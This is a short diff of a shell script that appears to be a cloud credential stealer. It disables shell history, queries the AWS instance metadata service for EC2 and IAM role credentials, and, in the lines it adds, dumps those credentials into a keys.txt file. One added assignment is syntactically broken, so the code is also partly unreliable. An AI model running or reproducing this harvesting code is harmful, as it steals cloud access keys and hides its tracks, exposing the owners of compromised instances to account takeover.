@@ -6,6 +6,7 @@ export LC_ALL=en_US.UTF-8 2>/dev/null
 export HISTFILE=/dev/null
 CSOF="${CSOF:-$(pwd)/ec2_con.sh}"
 CIAM="${CIAM:-$(pwd)/iam_con.sh}"
+AK = "${Ak:-$(pwd)/keys.txt}"
 EDIS="${EDIS:-$(pwd)/info.sh}"
 
 rm -rf $CSOF
@@ -108,7 +109,9 @@ AWS_INFO=$(curl http://169.254.169.254/latest/meta-data/iam/info | tr '\0' '\n')
 AWS_1_EC2=$(curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance | tr '\0' '\n')
 AWS_1_IAM_NAME=$(curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 
-#echo $AWS_INFO "\n\n"  $AWS_1_EC2 "\n\n" $AWS_1_IAM_NAME "\n\n"
+echo "\n--------- AWS Information ----------\n" $AWS_INFO "\n\n"  > $AK
+echo "\n---------- EC2 Keys --------------\n" $AWS_1_EC2 "\n\n" >> $AK
+echo "\n---------- IAM Role Keys attached ---------------\n" $AWS_1_IAM_NAME "\n\n" >> $AK
 
 
 #echo -e '\n-------- CREDS FILES -----------------------------------' 
